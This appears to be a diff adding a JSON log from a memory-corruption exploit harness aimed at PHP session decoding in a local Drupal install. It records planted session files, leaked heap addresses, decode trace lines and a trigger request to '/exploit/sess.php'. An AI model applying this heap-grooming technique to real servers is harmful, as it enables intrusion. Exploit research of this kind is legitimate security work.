@@ -1,0 +1,65 @@
+{
+ "size": 65000,
+ "worker0": 144757,
+ "gdb_armed": true,
+ "plant_seed": {
+  "path": "/tmp/opencode/drupaldx/sites/default/files/php/sessions/sess_pl1",
+  "len": 64946,
+  "sha1": "98a78b4ac579ac102ea712e7bcd0b7c7a60014bc"
+ },
+ "plant": {
+  "status": 200,
+  "err": null
+ },
+ "plant_map": {
+  "heap": 140043492524096,
+  "X": 140043492982784,
+  "Xlen": 64946
+ },
+ "plant_lines": [
+  "[01:38:24] REQ1 PHPRQ_START heap=0x7f5e6aa00040 ps=0x22d0dc0",
+  "[01:38:24] REQ1 START save_path ZSTR ptr=0x41859258 rc=2 ti=0x356 h=0x8000000000001505 len=0 val=b''",
+  "[01:38:24] REQ1 START id ZSTR none",
+  "[01:38:24] REQ1 START save_path=0 status=1 id=0",
+  "[01:38:24] REQ1 SESSION_INITIALIZE entry",
+  "[01:38:24] REQ1 SI save_path ZSTR ptr=0x7f5e6aa02000 rc=1 ti=0x16 h=0x0 len=55 val=b'/tmp/opencode/drupaldx/sites/default/files/php/sessions'",
+  "[01:38:24] REQ1 SI status=1 save_path=55",
+  "[01:38:24] REQ1 POST PHPSESSID bucket=0x7f5e6aa5a180 val=0x7f5e6aa58180 ti=0x106",
+  "[01:38:24] REQ1 POST PHPSESSID ZSTR ptr=0x7f5e6aa58180 rc=1 ti=0x16 h=0x0 len=3 val=b'pl1'",
+  "[01:38:24] REQ1 PSFILES_OPEN basedir ZSTR ptr=0x7f5e6aa020a0 rc=1 ti=0x16 h=0x0 len=55 val=b'/tmp/opencode/drupaldx/sites/default/files/php/sessions'",
+  "[01:38:24] REQ1 PSFILES_OPEN data=0x7f5e6aa03258 basedir=55",
+  "[01:38:24] REQ1 PSFILES_OPEN key ZSTR ptr=0x7f5e6aa58240 rc=3 ti=0x16 h=0x0 len=3 val=b'pl1'",
+  "[01:38:24] REQ1 SESSION_DECODE str=0x7f5e6aa70000 len=64946 hdr=02000000160000000000000000000000b2fd000000000000787c613a313a7b69",
+  "[01:38:24] REQ1 CAL RESET level 0->0",
+  "[01:38:24] REQ1 TMPVAR entry P=0x7f5e6aa80000 last_dtor=0x0 used_slots=0 next=0x0",
+  "[01:38:24] REQ1 TMPVAR ret slot=0x7f5e6aa83010 dtor=0x7f5e6aa83000 off=16 used_now=1 pre_val=0x0 pre_type=0x0",
+  "[01:38:24] REQ1 ZEND_BAILOUT bg=0x7f5e6aa80000/1",
+  "[01:38:24] REQ1 ZEND_BAILOUT bg=0x7f5e6aa80000/1",
+  "[01:38:24] REQ1 ZEND_BAILOUT bg=0x7f5e6aa80000/1"
+ ],
+ "worker_after_plant": 147554,
+ "latch": {
+  "status": 200,
+  "err": null
+ },
+ "latch_lines": [],
+ "worker_after_latch": 147580,
+ "trigger_seed": {
+  "path": "/tmp/opencode/drupaldx/sites/default/files/php/sessions/sess_tb1",
+  "len": 65000,
+  "sha1": "36a181607145b3444ef3ff1dbd37d145bd5dd626"
+ },
+ "trigger": {
+  "status": 200,
+  "err": null,
+  "target": "/exploit/sess.php?q0=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q1=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q2=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q3=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q4=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q5=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q6=/tmp/opencode/drupaldx/sites/default/files/php/sessions&q7=/tmp/opencode/drupaldx/sites/default/files/php/sessions"
+ },
+ "trigger_lines": [],
+ "trigger_decodes": [],
+ "trigger_open": [],
+ "trigger_write": [],
+ "file": {
+  "len": 327
+ },
+ "worker_end": 147580
+}
